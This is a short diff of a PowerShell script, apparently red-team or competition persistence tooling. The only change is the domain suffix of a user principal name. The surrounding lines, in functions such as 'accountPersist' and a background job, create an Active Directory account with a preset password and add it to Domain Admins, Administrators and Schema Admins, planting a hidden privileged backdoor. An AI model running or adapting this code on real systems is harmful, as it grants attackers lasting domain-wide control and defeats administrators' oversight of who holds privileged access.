@@ -79,7 +79,7 @@ function accountPersist{
         
     }
     catch{
-        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
+        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.lockdown') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
         Add-ADGroupMember -identity 'Domain Admins' -members $username
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
@@ -153,7 +153,7 @@ start-job -ScriptBlock{
         
     }
     catch{
-        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
+        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.lockdown') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
         Add-ADGroupMember -identity 'Domain Admins' -members $username
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
